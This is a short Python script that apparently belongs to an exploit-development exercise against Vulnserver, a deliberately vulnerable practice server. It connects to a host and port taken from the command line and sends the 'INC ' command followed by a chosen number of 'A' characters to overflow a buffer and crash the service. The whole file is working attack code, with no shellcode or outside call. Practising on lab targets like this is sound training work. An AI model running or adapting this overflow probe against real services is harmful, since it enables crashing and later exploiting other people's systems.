import sys
import socket


targetIP = sys.argv[1]
targetPort = int(sys.argv[2])
l = int(sys.argv[3])

command = "INC "

try:
	
	
	overflow = "A" * l
	bstring = command + overflow + "ALEX" +  "\r\n"
		
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(5)
	s.connect((targetIP, targetPort))
		
	d = s.recv(1024).decode()
	s.send(bstring.encode())
	d = s.recv(1024).decode()

	s.close()
		
		
except: 
	print("The vulnserver has crashed")
